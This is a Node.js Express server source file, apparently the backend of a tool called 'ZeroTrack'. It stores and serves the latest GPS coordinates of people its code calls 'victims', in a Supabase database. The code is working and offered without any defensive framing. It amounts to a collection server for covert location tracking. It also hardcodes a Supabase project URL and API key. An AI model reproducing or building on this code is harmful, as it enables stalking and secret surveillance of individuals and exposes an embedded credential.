const express = require("express");
const { createClient } = require("@supabase/supabase-js");
const app = express();
app.use(express.json());

const SUPABASE_URL = "https://rergtekkabatdaqyzfjs.supabase.co";
const SUPABASE_ANON_KEY = "sb_publishable_9XdB00d5-VrNQkrLAhZAVw__yiYZ7MU";
const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

console.log("Server avviato. Supabase config:", SUPABASE_URL);

app.post("/", async (req, res) => {
    console.log("📤 POST ricevuto, body raw:", JSON.stringify(req.body));
    const { victim, lat, lon } = req.body;
    console.log("📤 POST parsed:", victim, lat, lon);
    if (!victim || lat == null || lon == null) {
        console.log("❌ POST bad request: parametri mancanti");
        return res.status(400).json({ error: "bad request" });
    }
    try {
        console.log("🔍 Supabase upsert per victim:", victim);
        const { error } = await supabase
            .from("position")
            .upsert({ victim, lat, lon, ts: Date.now() }, { onConflict: "victim" });
        if (error) {
            console.error("❌ Supabase POST error:", error);
            throw error;
        }
        console.log("✅ POST success, rispondo ok");
        res.json({ ok: true, ts: Date.now() });
    } catch (e) {
        console.error("💥 POST exception:", e);
        res.status(500).json({ error: "database error" });
    }
});

app.get("/", async (req, res) => {
    console.log("📥 GET query params:", JSON.stringify(req.query));
    const victim = req.query.victim;
    console.log("🔍 GET victim raw:", victim, "type:", typeof victim);
    if (!victim) {
        return res.status(400).json({ error: "missing victim param" });
    }
    try {
        console.log("🔍 Supabase select per victim:", victim);
        const { data, error } = await supabase
            .from("position")
            .select("lat, lon, ts")
            .eq("victim", victim)
            .single();
        console.log("🔍 Supabase response data:", data, "error:", error);
        if (error) {
            console.log("❌ Supabase GET error:", error);
            if (error.code === "PGRST116") {
                return res.status(404).json({ error: "not found" });
            }
            throw error;
        }
        console.log("✅ GET success, data:", data);
        res.json(data);
    } catch (e) {
        console.error("💥 GET exception:", e);
        res.status(500).json({ error: "database error" });
    }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`ZeroTrack Supabase server on port ${PORT}`);
});
